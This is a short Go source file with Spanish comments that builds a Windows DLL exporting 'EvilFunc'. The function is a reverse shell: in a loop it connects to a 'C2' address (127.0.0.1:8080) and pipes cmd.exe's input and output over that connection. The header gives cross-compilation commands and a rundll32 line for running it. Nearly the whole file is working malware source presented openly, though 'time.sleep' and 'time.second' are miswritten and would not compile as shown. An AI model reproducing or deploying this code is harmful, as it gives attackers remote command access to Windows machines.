
//=========================================================//=========================================================//

// 	Buildear librerías en Go--> -Importar paquete C
//								-Comentario linea 17 hace que puedas llamar desde otro proceso a EvilFunc			  //
//	On Windows
//	go build -buildmode=c-shared -o rshell.dll
		
//	On Linux for Windows
//		GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=X86_64-w64-mingw32-gcc go build -buildmode
	
//	Test DLL
//		rundll32.exe rshell.dll,EvilFunc
//			rundll32 es un software para probar dlls

package main 

import "C"
import (
	"net"
	"os/exec"
	"time"
)

//export EvilFunc
func EvilFunc(){
	for {
		time.sleep(5 * time.second)
		//connect to C2
		conn,err := net.Dial("tcp", "127.0.0.1:8080")
		if err != nil {
			continue
		}
		
		//spawn shell
		cmd := exec.Command("cmd.exe")
		
		//send standards in/out/err to remote connection
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}

func main(){
	//leave blank
}